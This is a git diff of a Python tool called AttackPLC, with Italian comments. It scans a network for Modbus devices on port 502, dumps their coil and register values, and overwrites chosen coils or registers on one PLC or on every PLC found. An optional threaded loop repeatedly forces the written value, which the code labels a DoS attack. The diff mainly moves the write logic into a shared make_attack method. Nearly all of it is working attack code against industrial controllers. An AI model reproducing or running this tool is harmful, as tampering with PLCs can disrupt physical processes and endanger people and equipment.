@@ -1,6 +1,6 @@
 import os
 import time  # Per la sleep
-import datetime  # Per il timestamp dei file JSON
+import datetime  # Per il timestamp dei file JSON (per uso futuro)
 import nmap3  # Per lo scan della rete
 import json  # Per gestire i file json
 import threading  # Per fare poi il loop dell'attacco
@@ -36,6 +36,67 @@ class AttackPLC:
                 self.find_plcs()
             else:
                 return
+
+    """
+      Eseguo lo scan della rete con nmap filtrando la porta
+      502, così da trovare le PLC attive. 
+      Il modulo nmap3 restituisce nativamente in output input
+      in formato JSON, e di quello verrà poi fatto una specie
+      di parsing per trovare gli host che presentano la porta
+      502 aperta (e che indicano appunto le PLC). Il risultato
+      dell'intera scansione della rete e la lista delle PLC
+      trovate vengono salvate su file .json: il primo è per
+      mera referenza, il secondo servirà per i metodi di
+      questo script
+      """
+
+    def find_plcs(self):
+        # Chiedo all'utente quale rete vuole scansionare
+        net = input("Network to scan (CIDR format): ")
+
+        # Eseguo lo scan sulla rete specificata
+        print(f"Scanning {net}\n")
+        nmap = nmap3.NmapScanTechniques()
+        results = nmap.nmap_tcp_scan(net, args='-p 502')
+
+        # Salvo il risultato dello scan su file JSON
+        with open('network_scan.json', 'w') as f:
+            f.write(json.dumps(results, indent=4, sort_keys=True))
+
+        print("Active PLCs found: ")
+
+        # Questo serve esclusivamente come chiave
+        # per il dict che andrò a creare. Posso farlo
+        # partire anche da 0, è indifferente
+        plc_num = 1
+
+        # Elimino gli ultimi due campi della scansione, che
+        # non sono host, ma entry messe da nmap
+        for address in results:
+            if address == "runtime" or address == "stats":
+                continue
+
+            # Per ogni indirizzo ip trovato, verifico se la
+            # porta 502 è aperta. Se non lo è, salto al
+            # prossimo host
+            for port in results[address]['ports']:
+                if port['state'] != "open":
+                    continue
+
+                # Salvo l'host nel dict e incremento il valore
+                # della prossima chiave
+                self.plc_list[plc_num] = address
+                plc_num = plc_num + 1
+
+                # Stampo l'host a video
+                print(address)
+
+        # print(self.plc_list) #debug
+        print("\n")
+
+        # Salvo l'intero dict ottenuto su file .json
+        with open('plc_list.json', 'w') as p:
+            p.write(json.dumps(self.plc_list, indent=4))
 
     """
     Leggo i Discrete Input Registers (identificati da %IXa.b).
@@ -188,66 +249,8 @@ class AttackPLC:
 
         return registri
 
-    """
-    Eseguo lo scan della rete con nmap filtrando la porta
-    502, così da trovare le PLC attive. 
-    Il modulo nmap3 restituisce nativamente in output input
-    in formato JSON, e di quello verrà poi fatto una specie
-    di parsing per trovare gli host che presentano la porta
-    502 aperta (e che indicano appunto le PLC). Il risultato
-    dell'intera scansione della rete e la lista delle PLC
-    trovate vengono salvate su file .json: il primo è per
-    mera referenza, il secondo servirà per i metodi di
-    questo script
-    """
-
-    def find_plcs(self):
-        # Chiedo all'utente quale rete vuole scansionare
-        net = input("Network to scan (CIDR format): ")
-
-        # Eseguo lo scan sulla rete specificata
-        print(f"Scanning {net}\n")
-        nmap = nmap3.NmapScanTechniques()
-        results = nmap.nmap_tcp_scan(net, args='-p 502')
-
-        # Salvo il risultato dello scan su file JSON
-        with open('network_scan.json', 'w') as f:
-            f.write(json.dumps(results, indent=4, sort_keys=True))
-
-        print("Active PLCs found: ")
-
-        # Questo serve esclusivamente come chiave
-        # per il dict che andrò a creare. Posso farlo
-        # partire anche da 0, è indifferente
-        plc_num = 1
-
-        # Elimino gli ultimi due campi della scansione, che
-        # non sono host, ma entry messe da nmap
-        for address in results:
-            if address == "runtime" or address == "stats":
-                continue
-
-            # Per ogni indirizzo ip trovato, verifico se la
-            # porta 502 è aperta. Se non lo è, salto al
-            # prossimo host
-            for port in results[address]['ports']:
-                if port['state'] != "open":
-                    continue
-
-                # Salvo l'host nel dict e incremento il valore
-                # della prossima chiave
-                self.plc_list[plc_num] = address
-                plc_num = plc_num + 1
-
-                # Stampo l'host a video
-                print(address)
-
-        # print(self.plc_list) #debug
-        print("\n")
-
-        # Salvo l'intero dict ottenuto su file .json
-        with open('plc_list.json', 'w') as p:
-            p.write(json.dumps(self.plc_list, indent=4))
+    def read_registers(self, mb, dir, ir, hr, cl):
+        pass
 
     """
     Analizzo i registri di ogni PLC trovata in precedenza. E' necessario
@@ -268,13 +271,13 @@ class AttackPLC:
         # Converto l'elenco da JSON a dict
         plc_list = json.loads(buf)
 
+        req_di_registers = input("Discrete Input Registers. Enter address (0-99): ")
+        req_input_registers = input("Input Registers. Enter address range (0-1023): ")
+        req_holding_registers = input("Holding Registers. Enter address range (0-1023): ")
+        req_coils = input("Coils. Enter addresses separated by comma (0-99): ")
+
         if not single_plc == 'single':
             print("Scanning all PLCs\n")
-
-            req_di_registers = input("Discrete Input Registers. Enter address (0-99): ")
-            req_input_registers = input("Input Registers. Enter address range (0-1023): ")
-            req_holding_registers = input("Holding Registers. Enter address range (0-1023): ")
-            req_coils = input("Coils. Enter addresses separated by comma (0-99): ")
 
             # Analizzo le PLC una a una
             for plc in plc_list:
@@ -285,19 +288,19 @@ class AttackPLC:
 
                 # Leggo i Discrete Input Registers
                 self.disInReg = self.read_DiscreteInputRegisters(mb, 'all', req_di_registers)
-                print(self.disInReg)
+                # print(self.disInReg)
 
                 """
                 Come prima, ma per tutti gli altri registri!
                 """
                 self.InReg = self.read_InputRegisters(mb, 'all', req_input_registers)
-                print(self.InReg)
+                # print(self.InReg)
 
                 self.HolReg = self.read_HoldingOutputRegisters(mb, 'all', req_holding_registers)
-                print(self.HolReg)
+                # print(self.HolReg)
 
                 self.Coils = self.read_Coils(mb, 'all', req_coils)
-                print(self.Coils)
+                # print(self.Coils)
 
                 mb.close()
 
@@ -308,7 +311,7 @@ class AttackPLC:
                 self.plc_registers[plc_list[plc]]['Coils'] = self.Coils
 
             # Salvo il risultato della scansione su file
-            with open('plc_registers.json', 'w') as pr:
+            with open('all_plcs_registers.json', 'w') as pr:
                 pr.write(json.dumps(self.plc_registers, indent=4))
 
         else:
@@ -340,16 +343,16 @@ class AttackPLC:
             mb.connect()
 
             self.disInReg = self.read_DiscreteInputRegisters(mb, 'single')
-            print(self.disInReg)
+            # print(self.disInReg)
 
             self.InReg = self.read_InputRegisters(mb, 'single')
-            print(self.InReg)
+            # print(self.InReg)
 
             self.HolReg = self.read_HoldingOutputRegisters(mb, 'single')
-            print(self.HolReg)
+            # print(self.HolReg)
 
             self.Coils = self.read_Coils(mb, 'single')
-            print(self.Coils)
+            # print(self.Coils)
 
             mb.close()
 
@@ -398,7 +401,7 @@ class AttackPLC:
             mb = ModbusClient(plc, 502)
             mb.connect()
         except:
-            print("Connection failed")
+            print(f"Connection to {plc} failed. Exiting")
             return
 
         if reg_type == "coil":
@@ -416,6 +419,31 @@ class AttackPLC:
 
         mb.close()
 
+    def make_attack(self, plc, reg_type, modbus_addr, value, loop):
+        if reg_type == 'coil':
+            if loop == "Y" or loop == "y":
+                thr1 = threading.Thread(target=self.dos_attack, args=(plc, reg_type, int(modbus_addr), bool(value)))
+                thr1.start()
+            else:
+                mb = ModbusClient(plc, 502)
+                mb.connect()
+
+                mb.write_single_coil(modbus_addr, bool(value))
+
+                mb.close()
+
+        elif reg_type == "register":
+            if loop == "Y" or loop == "y":
+                thr1 = threading.Thread(target=self.dos_attack, args=(plc, reg_type, int(modbus_addr), int(value)))
+                thr1.start()
+            else:
+                mb = ModbusClient(plc, 502)
+                mb.connect()
+
+                mb.write_single_register(modbus_addr, int(value))
+
+                mb.close()
+
     """
     Cambio il valore di un registro sulla PLC
     """
@@ -424,7 +452,7 @@ class AttackPLC:
         if not single_plc == 'single':
             self.scan_is_present()
 
-            with open('plc_registers.json', 'r') as pl:
+            with open('all_plcs_registers.json', 'r') as pl:
                 plc_list = pl.read()
 
             plc_list = json.loads(plc_list)
@@ -464,29 +492,7 @@ class AttackPLC:
             for plc in plc_list:
                 print(f"Connecting to {plc}")
 
-                if reg_type == "coil":
-                    if loop == "Y" or loop == "y":
-                        thr1 = threading.Thread(target=self.dos_attack, args=(plc, reg_type, int(modbus_addr), bool(value)))
-                        thr1.start()
-                    else:
-                        mb = ModbusClient(plc, 502)
-                        mb.connect()
-
-                        mb.write_single_coil(modbus_addr, bool(value))
-
-                        mb.close()
-
-                elif reg_type == "register":
-                    if loop == "Y" or loop == "y":
-                        thr1 = threading.Thread(target=self.dos_attack, args=(plc, reg_type, int(modbus_addr), int(value)))
-                        thr1.start()
-                    else:
-                        mb = ModbusClient(plc, 502)
-                        mb.connect()
-
-                        mb.write_single_register(modbus_addr, int(value))
-
-                        mb.close()
+                self.make_attack(plc, reg_type, modbus_addr, value, loop)
 
         else:
             plc = None
@@ -542,30 +548,8 @@ class AttackPLC:
 
             reg_type, modbus_addr, value = self.select_register()
             loop = input("Do you want to perform a DoS on the register? [y/n]: ")
-            
-            if reg_type == "coil":
-                if loop == "Y" or loop == "y":
-                    thr1 = threading.Thread(target=self.dos_attack, args=(plc, reg_type, int(modbus_addr), bool(value)))
-                    thr1.start()
-                else:
-                    mb = ModbusClient(plc, 502)
-                    mb.connect()
 
-                    mb.write_single_coil(int(modbus_addr), bool(value))
-
-                    mb.close()
-                    
-            elif reg_type == "register":
-                if loop == "Y" or loop == "y":
-                    thr1 = threading.Thread(target=self.dos_attack, args=(plc, reg_type, int(modbus_addr), int(value)))
-                    thr1.start()
-                else:
-                    mb = ModbusClient(plc, 502)
-                    mb.connect()
-
-                    mb.write_single_coil(int(modbus_addr), int(value))
-
-                    mb.close()
+            self.make_attack(plc, reg_type, modbus_addr, value, loop)
 
         time.sleep(1)  # Altrimenti mi sballa la stampa in caso di thread
         input("Done. Presse Enter to continue: ")
